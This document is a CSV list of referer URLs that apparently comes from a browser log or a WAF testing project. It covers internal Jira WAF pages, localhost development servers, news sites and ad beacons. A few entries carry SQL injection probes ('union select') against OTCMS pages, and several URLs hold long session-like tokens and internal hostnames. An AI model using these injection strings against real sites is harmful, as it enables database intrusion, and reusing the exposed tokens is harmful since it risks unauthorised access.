httpReferer,encoder,mode_is
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3A%2FXQq6veVsMmYNCtUxD%2BLx8qGt63DUxCFA2eSCpKeEEhDK1x0qZyxm3kUfTaTiwj1CVjsbXOeP5pvNcE1S0CyxtxQOXldoO0Ab5DAaajaunY13%2FGQlb2xubMEUwHjQ98xiqw1AgauPO%2BH7IcLoS0aYNZSSfyhxufBFAp6n8j6u008n2p4Y1hfdUsPmOgGiO%2Bb3H8bnZ0J8ynNOhqO6NA7whu9GOpbi2RpoGWWpy%2BzlYWcuztL1vTygsM%2BT6F8rckNveu2GW%2B85GSb%2Fu8r1SfodlnW%2FLyvt3FMlwId%2FZzN85IZ22AO7sl08yavenQn6IMSblZCuTFSx4igfMa112el7F4PWwg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,393,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3A6ZYQExlhlR2%2BR14Mw3yGaoL0EDmtNhLrrNwigYLzvW4gVAUJZSicE9in1epaLbIJ2E10gJV%2BERGq36vOeQZpteWFxT%2FGMUu3syiOpTYTjaMBLAxNa9b%2F2D0GNUvuDpGm%2F%2BX6TW86Y8Frz93%2BYz7L%2BlCp4zxQxDKKS2lDi5BlJ9dQL3tq7ytoYL00aktihM%2FxnaqsDmAzEC10xv3SfJFa3N1%2F%2FYODMXi2MtSxhqd8yRVCLc7y%2BR%2Fk1rRjrGoXvNwtXHINo1TtJap%2BYnXvOqyhD9C8An6AcN0Cpn%2BOcOpgGuqBkhui6T11aRrCorvnuORl5IXCqTWWxUqOPN0yhTBDRGD%2B3tg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,394,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AZmZUb%2FQLtPoo5rLaIl4C2Vd47Bq%2BszMIRzl5xJJ60UcrZMJSjrNwKn0nb9g0FpwcFK1e5eedt3p7X75WDXB42Sj%2B35i%2BwFMamvsPC%2BClDqyoecpYMNTijdVP8iFQR2jMWj3KlsFK6%2BYtbZ5YM2yqI1HMhWH5WuLJ1UJrX30cQeNvD6GdbcxR4iBCq5khEXTglycibhEsVruU0s2dhRw0O0UAK3fm1ITS79fky3GFC1czvCqeCYPlKF%2FhSKPxjp5fk2TWcbWyJOuW0EyOw700A7rzpdFYU0yWk3O%2Fo91jyFDVujUhGnGonHjqQJZ%2FBwpFezEI11gMJxPGbQdKxn8evfnh7ds%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,395,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AeE26CriyrUr8lylsqCKWbrt%2BaK3QBG8PfxokUgiRJ67SGBW5TdkBijGXRJMBs5R4btmN03qKHYwJqma%2BpPBhskjS3x7j1r8TE02Zt3T%2FPgZZoSEVZfMUA1XBsjZawAoFqqM9WBdT9zc6T%2BzRaXfdQZ1ht0Q2p5fQhECN6lMaVMhRZIBCOOj1%2FisYMOo5m4qbZp6lnkxFum5Ku2sjOiuCENSoU8fWp9DlRMD3TmymzxdrdMIfc7JgSgcq1NeRlpwlzHO%2F0%2FLkTIPAq%2BmG6XLEYryeUwpnFRSpFAi6LQQQGpCJZNKPUqhmJRmgue7rT4qaP%2FGcyiBl9BaeqwH6ZRLkjcqy4H4%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,396,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3Ai3f5FQa9PjN35CjIItlKzshUlwy4JBTvZo25pu1WUWn7PxPZ0%2FgsQQQY6OkFnxIbdy%2F8GGv1%2FAgzNV6mEVl9X4cNZrtk3rSEfoEq0SYBjdGbwrAJx3CcuYSc3zSLQsEKikJ2AngxNEbY23GV4J3gxl5DWpA8NSEtp71D3E7pFuBq6IJQKWOmGLwaKqXC0RNKNnjaxaH5ajdgmrTQSZyFoSQGcfhPzzbAxNJp5cwuLcoROaqY9BKsQnZ8F5fHVkAkudRmEWzh4OlCLMlvhLXDMRqNGdcVJVu%2BPtmsxWLWJJAYIL6z4y%2FAHbyjIr3ep8QvR3DH%2FZkLtnyWYEdfqTjpamJGPAs%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,397,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3An6T119pAvkTIsh50N9qA8YmTwxGs09ca8V8Qm46Cbs43b%2Bx%2F%2FtFsXEH9kVuOa25mvBd%2FfEj%2Ft70zqH810ofH9M56cYAXvZSyxLINtgSJQfLG%2B12nSTUowpeQazF0nSBWGRfb5SmQqGctnYCurNefswFrJexbqT8xIFEhhzRPXYBPKGDedxma5MDyUufheTlUdKDe3r4PfTUGf7GVaBvsUt6mhQ4aXhPTHUtVADmhZQpuhrSdmugOCIuZRehuNYvH%2BujniAol3D7%2FeyQPoRSsNJJ8IpWJ4g768xby8j%2Bf%2BWvtuq8CThuu6gAssyAT8xBfTMoWD%2FeY3851n6GyAgcJ6ATwakQ%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,398,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AsANs3cTcNurkzTGcbx1D7j6czHHdAEjeE8clpSq58qPJbHoMtF0rg7J%2BZ5KwrsAKDhUya6I1bfgPQJ6t%2Fq%2FWQtaq0ExGyrYvySN4ghg7P%2F7BniDq8pvU4NYmvXsJhRZiTs78MDXzeyxGXpYPdYGWmLgI0n4dm4MsH4ei5DVfaPwFKBVv1iKu8o7j35cUEkwBve2ns8PCu17tbKlbVIMXDBmFpmAlMidftM8%2FwzCE8lkCnd1lyBLZAv%2FCLOxdtBuw7MMUnrqLvP8iOIkfdjHba%2BQQ1LdxgnxJEzh4qEXXt4XZeDqqHG93DbO3JkB%2BIQClyku2BHcACRttGFLmNGdK0rUT2yg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,399,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10205&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22true%22%7D&st=atlassian%3A6mfbnflL%2FDX33m%2B9Y86J5UMJo%2FrK%2Bn8J7vpt%2Bbj3%2FzEudJ6cGjyn47nibnWdKVaat4f8tiaDrfpx3U%2F%2FilTrhMP4ew8jeu1DI4wY9yV3rOZrFL9SWKvt9z%2FmV4CUJcv%2B97tE643ptz9fvk%2BoTxdN4vEHvF330pD5NrTOjt%2FXiDIkb9tVfgHl1Yu4%2BNGO1%2FdVWydPLHPFXwCAFwD5enCTsgGHxJXVSi7ah3AXJWeaE%2FdGXfKE4sMAaiMo8AoPE9Y1ZJkYw2MSKudeoR%2FmfKN%2F0S7m%2BAUXGekd6CeHR29uWW4npdpLdaqViLvEGACtXzt8R%2BMhGw%3D%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,400,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10205&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22true%22%7D&st=atlassian%3ASy0NZQm8dggqm16O%2Fg4UXKnYdVvP2W1zZQlIpmaHABaYnbcOqclZ6Aqibq2b85O2ezollJqvqDop9vYQ2fev3dh%2BPmcOC%2B79uMMojEyqd%2BtxIkiLE7lCJ1wPYv9T16Aq2heQRQTjOlOPhm7VuLebaqdy2xUsRy%2FbiigE0CYg7f8hk9F4dka3VuctUWq5ingAROZxymmoHy8L3jBNv%2F%2BdeFV3RKloe%2BYJ1h5nX0Zc%2F98Bw%2FxVOKVKnJOBgBMBbJ6vc6WjcrmCqlYkch%2BRwQWiW53GETZD4GJNbWVnWTbjwEFwIQpt6F%2F4ixQ0aFwS%2FBLnilQFlw%3D%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,401,0
http://jira.ngwdev.com/projects/WAF/issues/WAF-427?filter=allopenissues,402,0
http://jira.ngwdev.com/projects/WAF/summary,403,0
http://jira.ngwdev.com/secure/Dashboard.jspa,404,0
http://k.sina.com.cn/article_1912964267_720584ab02000mboj.html?from=news&subch=onews,405,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/add,406,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/checkDetail/61,407,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/kakouSelect,408,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/list,409,0
http://lagignition.blog.163.com/blog/static/12873002320109135292479/,410,0
http://live.vhall.com/572867870,411,0
"http://localhost/otcms/news/?list_refer-content-union%20select%201,2,3.html",412,0
http://localhost:8088/backup,413,0
http://localhost:8088/company,414,0
http://localhost:8094/,415,0
http://localhost:8094/fangyi?name=12589&cityId=194&cityName=%E6%9D%AD%E5%B7%9E%E5%B8%82&provinceId=96,416,0
http://localhost:8094/newhome,417,0
http://m.116wx.com/read/101/101275/45527259.html,418,0
"http://m.baidu.com/from=1000953c/ssid=0/s?word=%E5%AD%A6%E6%A0%A1%E6%B0%B4%E7%94%B5%E7%BB%B4%E4%BF%AE%E5%B7%A5%E6%8B%9B%E8%81%98&sa=re_dl_prs_34689_1&rqid=10756492727568937665&rq=%E6%9D%AD%E5%B7%9E%E5%B8%82%E7%BB%BC%E5%90%88%E7%BB%B4%E4%BF%AE%E5%B7%A5%E6%8B%9B%E8%81%98&rsf=53040014&asctag=72945&ssid=0&from=1000953c&uid=0&pu=usm@3,sz@320_1002,ta@iphone_2_5.1_2_5.3&bd_page_type=1&baiduid=D87B49E01982D06CE49C5AE564927015&tj=9Xx_5_0_10_lNaN",419,0
http://m.baidu.com/s?from=1000953c&word=%E6%9D%AD%E5%B7%9E%E5%B8%82%E7%BB%BC%E5%90%88%E7%BB%B4%E4%BF%AE%E5%B7%A5%E6%8B%9B%E8%81%98,420,0
http://m.baidu.com/s?from=1000953c&word=58%E5%90%8C%E5%9F%8E%E7%BB%BC%E5%90%88%E7%BB%B4%E4%BF%AE%E7%94%B5%E5%B7%A5,421,0
http://m.baidu.com/s?from=1269a&word=%E5%BE%AE%E4%BF%A1,422,0
http://m.dianping.com/shop/110859340/review_all,423,0
http://m.gmw.cn/uctt/202002/25/1300982562.html?from=uctt_news&zzd_from=uc-iflow&sm_article_id=1103102783423176227&dl_type=3&uc_biz_str=S%3Acustom%7CC%3Aiflow_wm2&rd_type=reco&recoid=5655091319633353066&sp_gz=3&cid=100&app=uc-iflow&activity=1&activity2=1,424,0
http://mail.sichuanair.com/?q=base,425,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=39382,426,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=40154,427,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=43280,428,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=PersonalBug_all&id=42976,429,0
http://manager.websaas.cn/monitor/template,430,0
http://manager.websaas.cn/operate-tool/misinform,431,0
http://manager.websaas.cn/protect/configureSite,432,0
http://manager.websaas.cn/protect/newSite?contract_id=,433,0
http://mars3d.cn/forcesium/tutorials/Cesium-Workshop/index.html,434,0
http://masinvest.mas.gov.cn/?keywords=1&all=0,435,0
http://mini.cpc.sogou.com/artemis/test_sirius.html?pid=sogou_weimenghu_brandmini&mid=403988&rtype=2,436,0
http://mini.flash.2144.com/20181113/count.html,437,0
http://mini.flash.2144.com/20190806/mini-h-200110144623/index.html?_category_id=8&_plan_id=180&_content_id=422&_material_id=0&tt=156265658701&_times=2,438,0
http://mini.flash.2144.com/20190806/mini-h-200110144623/index.html?_category_id=8&_plan_id=180&_content_id=422&_material_id=0&tt=156265658701&_times=2&_opentype=bootup,439,0
http://mini.flash.2144.com/20190806/mini-h-200110144623/index.html?_category_id=8&_plan_id=180&_content_id=422&_material_id=0&tt=156265658701&_times=2&_opentype=minitaskscheduler,440,0
http://mini.flash.2144.com/20190806/mini-main-200110084749/index.html?_category_id=7&_plan_id=63&_content_id=414&_material_id=0&tt=156265658701&_times=1,441,0
http://mini.flash.2144.com/20190806/mini-main-200110084749/index.html?_category_id=7&_plan_id=63&_content_id=414&_material_id=0&tt=156265658701&_times=1&_opentype=bootup,442,0
http://mini.flash.2144.com/20190806/mini-main-200110084749/index.html?_category_id=7&_plan_id=63&_content_id=414&_material_id=0&tt=156265658701&_times=1&_opentype=minitaskscheduler,443,0
http://mini.flash.2144.com/20191210/mini-game-200108183550/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1,444,0
http://mini.flash.2144.com/20191210/mini-game-200108183550/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1&_opentype=bootup,445,0
http://mini.flash.2144.com/20191210/mini-game-200222150458/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1&_opentype=bootup,446,0
http://mini.flash.2144.com/20191210/mini-game-200222150458/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1&_opentype=minitaskscheduler,447,0
http://mogu.jdbbx.com/PlugInfo.aspx?id=207,448,0
http://music.163.com/di,449,0
http://mydbfx.com/?p=12521,450,0
http://myhome.dangdang.com/myOrder,451,0
http://myidushe.zuopinj.com/11337/299412.html,452,0
http://news.163.com/,453,0
http://news.163.com/19/0328/13/EBBV8MGD000189DG.html,454,0
http://news.163.com/photoview/00AN0001/2306876.html,455,0
http://news.sina.com.cn/c/2020-02-25/doc-iimxyqvz5595464.shtml,456,0
http://news.sina.com.cn/ts/2020-02-02/doc-iimxxste8270575.shtml,457,0
http://news.sina.com.cn/ts/2020-02-13/doc-iimxxstf1098958.shtml,458,0
http://news.sina.com.cn/w/2020-02-25/doc-iimxyqvz5572082.shtml,459,0
http://news.sina.com.cn/w/2020-02-26/doc-iimxxstf4409149.shtml,460,0
http://pan.qun.qq.com/clt_filetab/groupShareClientNew.html,461,0
http://pc.xunlei.com/pages/,462,0
http://phpgg.otcms.org/ads.php?adWebTitle=%E6%90%9C%E7%B4%A2%28%E6%AD%A3%E6%96%87%29%EF%BC%9Aunion+select+123_%E7%BD%91%E9%92%9BCMS%28OTCMS%29+PHP%E7%89%88+V5.xx&adDate=20191101&adID=12&adBox=true,463,0
http://phpgg.otcms.org/ads.php?adWebTitle=%E6%90%9C%E7%B4%A2%28%E6%AD%A3%E6%96%87%29%EF%BC%9Aunion+select+123_%E7%BD%91%E9%92%9BCMS%28OTCMS%29+PHP%E7%89%88+V5.xx&adDate=20191101&adID=21&adBox=true,464,0
http://pingan.websaas.cn/zentao/index.php?m=bug&f=create&productID=16&branch=0&extra=moduleID=0,465,0
http://popup.sohu.com/v2?sfsw=000&g=0.*,466,0
http://popup.sohu.com/v2?sfsw=001&g=0.*,467,0
http://pos.baidu.com/cccm?conwid=300&conhei=250&rdid=5526127&dc=3&exps=110011&psi=38a39e56411c148c8a9eeda405f5d2db&di=u5526127&dri=0&dis=0&dai=6&ps=3595x959&enu=encoding&ant=0&dcb=___adblockplus_&dtm=HTML_POST&dvi=0.0&dci=-1&dpt=none&tsr=0&tpr=1582593517135&ti=%E5%8D%8E%E4%B8%BAMateXs%E4%B8%8A%E6%89%8B%E8%AF%84%E6%B5%8B&ari=2&ver=0214&dbv=2&drs=3&pcs=1519x754&pss=1519x13704&cfv=0&cpl=3&chi=1&cce=true&cec=GBK&tlm=1582593518&rw=754&ltu=http%3A%2F%2Fmobile.zol.com.cn%2F738%2F7387593.html%3Ffrom%3Dbd&ltr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbU3OyUEYcsUQWGBGkCn4NuJHzk3CFDAvQ2K__I4oW5EYP3xmN3GMhFsJByZD1cWbogkAs3wIslRspAA9b-wuaa%26wd%3D%26eqid%3Decc6fb900015cdc2000000045e5475e6&lcr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbU3OyUEYcsUQWGBGkCn4NuJHzk3CFDAvQ2K__I4oW5EYP3xmN3GMhFsJByZD1cWbogkAs3wIslRspAA9b-wuaa%26wd%3D%26eqid%3Decc6fb900015cdc2000000045e5475e6&ecd=1&uc=1536x824&pis=-1x-1&sr=1536x864&tcn=1582593518&qn=b1b16be32daefc41&tt=1582593518080.38.346.*,468,0
http://pos.baidu.com/jcnm?conwid=300&conhei=250&rdid=4396777&dc=3&exps=110011&psi=24a7bf49af4d6f7380cdd2bf0f058b23&di=u4396777&dri=1&dis=0&dai=7&ps=100x0&enu=encoding&ant=0&dcb=___adblockplus_&dtm=HTML_POST&dvi=0.0&dci=-1&dpt=none&tsr=0&tpr=1581996434732&ti=%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92Maze-%E7%AB%99%E9%95%BF%&ari=2&ver=0214&dbv=2&drs=1&pcs=1263x597&pss=1263x2161&cfv=0&cpl=21&chi=1&cce=true&cec=UTF-8&tlm=1581996435&rw=597&ltu=http%3A%2F%2Fwww.chinaz.com%2Ftags%2FlesuobingduMaze.shtml&ltr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DHAzHddk8hUb3cnDMnrFgDJg_gboAU_tZmH2-MuTEk_1z-LP6leb6vV6f8G1MSH-NG9ChXald_RTEr0wVkWqSpq%26wd%3D%26eqid%3D96478d0e00443599000000045e4b55d8&lcr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DHAzHddk8hUb3cnDMnrFgDJg_gboAU_tZmH2-MuTEk_1z-LP6leb6vV6f8G1MSH-NG9ChXald_RTEr0wVkWqSpq%26wd%3D%26eqid%3D96478d0e00443599000000045e4b55d8&ecd=1&uc=1280x690&pis=-1x-1&sr=1280x720&tcn=1581996436&qn=244565ea6eac9458&tt=1581996435370.330.388.*,469,0
http://pos.baidu.com/lcim?conwid=300&conhei=250&rdid=4178566&dc=3&exps=110011&psi=b7027ae588c44fa6616ec4f010b23a54&di=u4178566&dri=0&dis=0&dai=4&ps=403x1032&enu=encoding&ant=0&dcb=___adblockplus_&dtm=HTML_POST&dvi=0.0&dci=-1&dpt=none&tsr=0&tpr=1582599044040&ti=%E6%9D%AD%E5%B7%9E%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%2C%E6&ari=2&ver=0214&dbv=2&drs=1&pcs=1664x919&pss=1664x4130&cfv=0&cpl=3&chi=1&cce=true&cec=UTF-8&tlm=1582599045&rw=919&ltu=http%3A%2F%2Fwww.weather.com.cn%2Fweather%2F101210101.shtml%237d&ltr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbxR-KBfgnm5kA_1klId-VU6RwBiY9WpK3_vMdYMJod9Bfy2MuO2jD8YfFvZJrB2It7wIMp7VXUaxdFzk4eVdGK%26wd%3D%26eqid%3Df07dca680004dc7c000000045e548b73&lcr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbxR-KBfgnm5kA_1klId-VU6RwBiY9WpK3_vMdYMJod9Bfy2MuO2jD8YfFvZJrB2It7wIMp7VXUaxdFzk4eVdGK%26wd%3D%26eqid%3Df07dca680004dc7c000000045e548b73&ecd=1&uc=1680x1022&pis=-1x-1&sr=1680x1050&tcn=1582599045&qn=a2c32fae0c6d408e&tt=1582599043917.1526.1526.*,470,0
http://product.dangdang.com/27941047.html,471,0
http://product.dangdang.com/28507437.html,472,0
http://product.yesky.com/product/966/966727/,473,0
http://pss-system.cnipa.gov.cn/sipopublicsearch/portal/uiIndex.shtml,474,0
http://px.tcnet.com.cn/,475,0
http://px.tcnet.com.cn/partner/,476,0
http://px.tcnet.com.cn/partner/1298.html,477,0
http://q.sto.cn/service/customerservice,478,0
http://qinfo.clt.qq.com/qinfo_v3/setting.html,479,0
http://qqclient.qq.com,480,0
http://quote.eastmoney.com/concept/sz300033.html?from=classic,481,0
http://quote.eastmoney.com/hk/08083.html?from=BaiduAladdin,482,0
